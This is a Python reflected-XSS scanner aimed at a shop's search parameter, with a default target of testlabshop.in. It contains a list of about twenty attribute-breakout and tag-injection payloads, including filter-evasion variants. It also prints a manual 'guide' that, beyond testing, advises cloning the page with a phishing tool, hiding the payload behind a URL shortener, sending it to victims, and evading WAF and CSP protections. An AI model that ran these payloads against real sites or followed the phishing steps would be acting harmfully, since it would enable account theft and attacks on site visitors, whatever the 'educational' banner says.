import requests
from urllib.parse import quote, urlencode
from bs4 import BeautifulSoup
import time

class XSSTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.found_xss = []
        
    def test_payload(self, payload, description):
        """Test a single XSS payload"""
        print(f"\n{'='*70}")
        print(f"Testing: {description}")
        print(f"Payload: {payload}")
        print(f"{'='*70}")
        
        # Build URL
        params = {
            's': payload,
            'post_type': 'product',
            'type_aws': 'true'
        }
        
        url = f"{self.base_url}?{urlencode(params)}"
        print(f"URL: {url}\n")
        
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find the search input
            search_input = soup.find('input', {'name': 's'})
            
            if search_input:
                value = search_input.get('value', '')
                outer_html = str(search_input)
                
                print(f"Input value attribute: {value}")
                print(f"Full input HTML:\n{outer_html}\n")
                
                # Check for XSS indicators
                xss_indicators = [
                    'onfocus=',
                    'onmouseover=',
                    'oninput=',
                    'onanimationstart=',
                    'autofocus',
                    '<script>',
                    'javascript:',
                    'alert(',
                    'prompt(',
                    'confirm('
                ]
                
                found = False
                for indicator in xss_indicators:
                    if indicator.lower() in outer_html.lower() and indicator.lower() not in ['value=', 'name=', 'class=']:
                        print(f"✅ POTENTIAL XSS: Found '{indicator}'")
                        found = True
                
                if found:
                    self.found_xss.append({
                        'payload': payload,
                        'description': description,
                        'url': url,
                        'html': outer_html
                    })
                    print(f"\n🎯 XSS LIKELY SUCCESSFUL!")
                else:
                    # Check if payload is reflected but encoded
                    if payload.replace('"', '&quot;') in outer_html:
                        print(f"⚠️  Payload reflected but HTML-encoded")
                    elif any(char in outer_html for char in ['&lt;', '&gt;', '&quot;']):
                        print(f"⚠️  HTML encoding detected")
                    else:
                        print(f"❌ Payload not reflected or filtered")
            else:
                print("❌ Search input not found")
                
        except Exception as e:
            print(f"❌ Error: {e}")
        
        time.sleep(1)  # Rate limiting
    
    def run_all_tests(self):
        """Run comprehensive XSS tests"""
        
        payloads = [
            # Event handler injections
            ('" onfocus="alert(1)" autofocus="', 'OnFocus with AutoFocus'),
            ('" onmouseover="alert(1)" x="', 'OnMouseOver'),
            ('" oninput="alert(1)" x="', 'OnInput'),
            ('" onchange="alert(1)" x="', 'OnChange'),
            ('" onkeydown="alert(1)" x="', 'OnKeyDown'),
            ('" onkeyup="alert(1)" x="', 'OnKeyUp'),
            
            # Breaking out of attribute
            ('"><img src=x onerror=alert(1)>', 'IMG tag injection'),
            ('"><svg onload=alert(1)>', 'SVG tag injection'),
            ('"><input onfocus=alert(1) autofocus>', 'Input tag injection'),
            ('"><body onload=alert(1)>', 'Body tag injection'),
            
            # Animation/CSS tricks
            ('" style="animation-name:x" onanimationstart="alert(1)" x="', 'Animation event'),
            ('" style="animation-name:x" onanimationend="alert(1)" x="', 'Animation end'),
            
            # Data URI
            ('" src="data:text/html,<script>alert(1)</script>" x="', 'Data URI'),
            
            # JavaScript protocol
            ('" onclick="javascript:alert(1)" x="', 'JavaScript protocol'),
            
            # Template literals (if JS context)
            ('${alert(1)}', 'Template literal'),
            
            # Without quotes (if context allows)
            ('x onfocus=alert(1) autofocus', 'No quotes'),
            
            # Mixed case evasion
            ('" OnFoCuS="alert(1)" AuToFoCuS="', 'Mixed case'),
            
            # Using backticks
            ('" onfocus=`alert(1)` autofocus="', 'Backticks'),
            
            # Multiple attributes
            ('" onfocus="alert(1)" onblur="alert(2)" autofocus="', 'Multiple events'),
            
            # Encoded versions
            ('" onfocus="alert(String.fromCharCode(88,83,83))" autofocus="', 'Encoded XSS'),
        ]
        
        print("\n" + "="*70)
        print("🎯 XSS VULNERABILITY TESTER")
        print("="*70)
        print(f"\nTarget: {self.base_url}")
        print(f"Total payloads: {len(payloads)}\n")
        
        for payload, description in payloads:
            self.test_payload(payload, description)
        
        # Summary
        print("\n" + "="*70)
        print("📊 SUMMARY")
        print("="*70)
        
        if self.found_xss:
            print(f"\n✅ Found {len(self.found_xss)} potential XSS vulnerability/vulnerabilities!\n")
            for i, xss in enumerate(self.found_xss, 1):
                print(f"\n{i}. {xss['description']}")
                print(f"   Payload: {xss['payload']}")
                print(f"   URL: {xss['url']}")
                print(f"   HTML: {xss['html'][:200]}...")
        else:
            print("\n❌ No XSS vulnerabilities found with these payloads.")
            print("\nSuggestions:")
            print("- Try manual testing in browser")
            print("- Check for JavaScript context XSS")
            print("- Look for other input fields")
            print("- Test with different browsers")
        
        print("\n" + "="*70 + "\n")
        
        return self.found_xss


def manual_test_guide():
    """Print manual testing guide"""
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║              MANUAL XSS TESTING GUIDE                        ║
    ╚══════════════════════════════════════════════════════════════╝
    
    🔍 STEP-BY-STEP MANUAL TESTING:
    
    1. BASIC EVENT HANDLER:
       Try in URL bar:
       https://testlabshop.in/?s=" onfocus="alert(1)" autofocus="&post_type=product
    
    2. BREAK OUT OF INPUT:
       https://testlabshop.in/?s="><img src=x onerror=alert(1)>&post_type=product
    
    3. USING CONSOLE (Your working method):
       a) Open Developer Console (F12)
       b) Paste this:
          document.querySelector('input[name="s"]').setAttribute('onfocus', 'alert(document.domain)');
          document.querySelector('input[name="s"]').focus();
       c) If alert shows, XSS is possible
    
    4. CRAFT EXPLOIT URL:
       Since console works, the vulnerability exists.
       The issue might be:
       - URL encoding
       - WAF blocking
       - Content Security Policy (CSP)
    
    5. CHECK CSP:
       In console, type:
       console.log(document.querySelector('meta[http-equiv="Content-Security-Policy"]'));
       
       If CSP exists, you may need CSP bypass techniques.
    
    6. ALTERNATIVE PAYLOADS:
       Try these one by one in the search box:
       
       " autofocus onfocus="alert(1)" x="
       " onmouseover="alert(1)" style="position:absolute;left:0;top:0;width:100%;height:100%" x="
       " onanimationstart="alert(1)" style="animation-name:x" x="
    
    7. SOCIAL ENGINEERING EXPLOIT:
       If URL-based XSS doesn't work, you can:
       a) Clone the page (using phishing cloner)
       b) Add JavaScript to inject the XSS
       c) Send to victim
    
    ⚠️  COMMON ISSUES:
    
    - URL encoding: Browser might encode your payload
      Solution: Use Burp Suite or curl to send raw request
    
    - WAF blocking: Web Application Firewall detecting attack
      Solution: Try obfuscation or encoding
    
    - CSP blocking: Content Security Policy preventing inline scripts
      Solution: Find CSP bypass or use allowed domains
    
    📝 PROOF OF CONCEPT:
    
    If manual injection works, create PoC:
    1. Craft malicious URL
    2. Use URL shortener to hide payload
    3. Send to target
    4. When they click, XSS executes
    
    """)


if __name__ == "__main__":
    import sys
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║              XSS VULNERABILITY SCANNER                       ║
    ║                  For Educational Use Only                    ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    choice = input("\n[1] Automated scan\n[2] Manual testing guide\n[3] Both\n\nChoice: ").strip()
    
    if choice in ['1', '3']:
        target_url = input("\nEnter target URL [https://testlabshop.in/]: ").strip()
        if not target_url:
            target_url = "https://testlabshop.in/"
        
        tester = XSSTester(target_url)
        results = tester.run_all_tests()
        
        # Save results
        if results:
            with open('xss_results.txt', 'w') as f:
                f.write("XSS Scan Results\n")
                f.write("="*70 + "\n\n")
                for xss in results:
                    f.write(f"Description: {xss['description']}\n")
                    f.write(f"Payload: {xss['payload']}\n")
                    f.write(f"URL: {xss['url']}\n")
                    f.write(f"HTML: {xss['html']}\n\n")
            print(f"📄 Results saved to: xss_results.txt")
    
    if choice in ['2', '3']:
        manual_test_guide()1